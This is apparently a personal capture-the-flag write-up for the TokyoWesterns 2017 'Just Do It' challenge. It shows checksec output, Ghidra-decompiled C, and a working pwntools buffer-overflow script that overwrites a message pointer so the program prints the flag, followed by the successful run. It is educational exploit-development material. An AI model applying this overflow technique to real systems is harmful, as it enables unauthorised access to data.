# Just Do it - Nightmare

check the file
```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/TokyoWesterns17_JustDoIt$ file just 
just: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
matan@matan:~/Documents/hacking/nightmare/stackoverflow/TokyoWesterns17_JustDoIt$ checksec --file just 
Error: The file 'file' does not exist.

matan@matan:~/Documents/hacking/nightmare/stackoverflow/TokyoWesterns17_JustDoIt$ checksec --file=just 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   82) Symbols	  No	0		1		just
```

nothing special lets reverse the file in Ghidra:
```c

undefined4 main(undefined param_1)

{
  char *pcVar1;
  int iVar2;
  char local_28 [16];
  FILE *local_18;
  char *local_14;
  undefined1 *local_c;
  
  local_c = &param_1;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pcVar1 = fgets(flag,0x30,local_18);
  if (pcVar1 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,PASSWORD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}

```

we can see that in order to get the flag we need to change pointer of local_14 to pointer of global variable flag.
so we can overflow `pcVar1 = fgets(local_28,0x20,stdin);` in order to override local_14.

Lets write script:
```python
#!/usr/bin/env python
from pwn import process, packing

def exploit():
    buffer = b'A' * 20 + packing.p32(0x0804a080)
    prs = process("./just")
    prs.sendline(buffer)
    prs.interactive()


if __name__ == '__main__':
    exploit()

```
solution:
```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/TokyoWesterns17_JustDoIt$python /home/matan/Documents/hde65/web_requests/nightmare/just_do_it.py
[+] Starting local process '/home/matan/Documents/hacking/nightmare/stackoverflow/TokyoWesterns17_JustDoIt/just': pid 47107
[*] Switching to interactive mode
[*] Process '/home/matan/Documents/hacking/nightmare/stackoverflow/TokyoWesterns17_JustDoIt/just' stopped with exit code 0 (pid 47107)
Welcome my secret service. Do you know the password?
Input the password.
TWCTF{pwnable_warmup_I_did_it!}

[*] Got EOF while reading in interactive
```

```

